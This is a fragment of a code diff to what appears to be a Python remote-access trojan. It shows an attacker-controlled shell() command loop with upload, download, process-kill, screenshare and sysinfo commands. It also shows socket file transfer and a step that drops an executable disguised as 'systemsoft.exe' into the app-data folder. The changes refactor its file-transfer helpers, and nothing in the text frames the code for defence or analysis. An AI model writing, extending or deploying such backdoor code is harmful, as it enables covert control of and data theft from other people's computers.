@@ -576,40 +576,17 @@ def reliable_recv():
 
 def download_file(file_name):
 
-    f = open(file_name, 'wb')
-    s.settimeout(1)
-    chunk = s.recv(1024)
-    if chunk.decode() == "fnfound":
-        s.send("[-] file not found".encode())
-        s.settimeout(None)
-    else:
+        f = open(file_name, 'wb')
+        s.settimeout(1)
+        chunk = s.recv(1024)
         while chunk:
             f.write(chunk)
             try:
                 chunk = s.recv(1024)
-            except Exception as e:
+            except socket.timeout as e:
                 break
-
         s.settimeout(None)
         f.close()
-
-def download_ngrok(file_name):
-
-    f = open(file_name, 'wb')
-    s.settimeout(1)
-    chunk = s.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = s.recv(1024)
-        except socket.timeout as e:
-            break
-    s.settimeout(None)
-    f.close()
-
-
-
-
 
 
 def upload_file(file_name):
@@ -684,16 +661,16 @@ def shell():
                         reliable_send('[-]Error')
 
                 elif command[:6] == 'upload':
+                    try:
                         download_file(command[7:])
-
+                    except:
+                        continue
                 elif command[:4] == 'kill':
                     killprocess(command[5:])
                 elif command[:8] == 'download':
                     try:
-                        if isfile(command[9:]) == True:
                             upload_file(command[9:])
-                        else:
-                            s.send('fnfound'.encode())
+
                     except:
                         continue
                 elif command == 'back':
@@ -844,7 +821,7 @@ def shell():
                     threading.Thread(target=screenshare())
                 elif command == 'ngroksetup':
 
-                    download_ngrok(appd + '\\systemsoft.exe')
+                    download_file(appd + '\\systemsoft.exe')
                 elif command[:7] == 'sysinfo':
                     try:
                         sysinfo()
